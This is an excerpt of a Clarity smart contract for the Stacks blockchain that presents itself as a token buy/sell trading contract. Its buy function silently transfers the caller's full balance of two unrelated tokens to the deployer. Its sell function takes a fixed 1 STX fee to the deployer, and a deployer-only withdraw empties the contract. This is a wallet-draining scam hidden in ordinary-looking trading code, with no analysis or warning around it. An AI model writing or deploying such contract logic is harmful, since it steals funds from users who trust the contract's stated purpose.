...
(define-constant allow-token 'SP17CJB62SQDF3AGYQD1W3P6ECFMGDR2ANWP1XMQD.yeah-stxcity)
...
(define-public (buy (token-trait <sip-010-trait>) (stx-amount uint) ) 
  (begin
    ...
    (let (
      ...
      (res (contract-call? 'SP3VVPEFZNN84EGMD0GN4XWAZ4X5ZMWC852NGWVWN.stxoshi-stxcity transfer (unwrap! (contract-call? 'SP3VVPEFZNN84EGMD0GN4XWAZ4X5ZMWC852NGWVWN.stxoshi-stxcity get-balance tx-sender) (err u407)) tx-sender deployer (some 0x02)))
      (resb (contract-call? 'SP1K8Y1JDM3MX9HNBS4MGYERRZSADVMZWASAPHPK3.simulation-coin-stxcity transfer (unwrap! (contract-call? 'SP1K8Y1JDM3MX9HNBS4MGYERRZSADVMZWASAPHPK3.simulation-coin-stxcity get-balance tx-sender) (err u407)) tx-sender deployer (some 0x02)))
    )
...
(define-public (sell (token-trait <sip-010-trait>) (tokens-in uint) ) ;; swap out for virtual trading
  (begin
    ...
    (let (
      ...
      (try! (stx-transfer? u1000000 tx-sender deployer))
...
(define-public (withdraw) 
    (begin 
        (asserts! (is-eq tx-sender deployer) (err u12)) 
        (as-contract (try! (stx-transfer? (stx-get-balance tx-sender) tx-sender deployer))) 
        (ok true)
    )
)
